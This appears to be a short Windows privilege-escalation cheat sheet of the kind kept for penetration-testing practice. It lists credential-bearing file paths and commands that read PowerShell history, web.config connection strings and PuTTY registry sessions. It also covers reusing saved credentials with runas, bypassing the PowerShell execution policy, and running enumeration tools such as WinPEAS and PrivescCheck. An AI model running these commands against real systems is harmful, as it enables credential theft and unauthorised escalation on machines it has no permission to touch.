Unattended Windows Installations:
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml
    
Powershell History:
    cmd:   type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
($Env:userprofile  for Powershell)

Saved Windows Credentials:
    runas /savecred /user:admin cmd.exe (if any password found)
    
   
 IIS Configuration:
    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
    for a database:
    type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

Retrieve Credentials from Software: PuTTy
    reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
    
Scheduled Tasks:
    schtasks >>> icacls <executable>


WinPEAS

PrivescCheck
 To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions.
 
    PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
    PS C:\> . .\PrivescCheck.ps1
    PS C:\> Invoke-PrivescCheck
    
 WES-NG: Windows Exploit Suggester - Next Generation
 
 multi/recon/local_exploit_suggester (if done by metasploit)
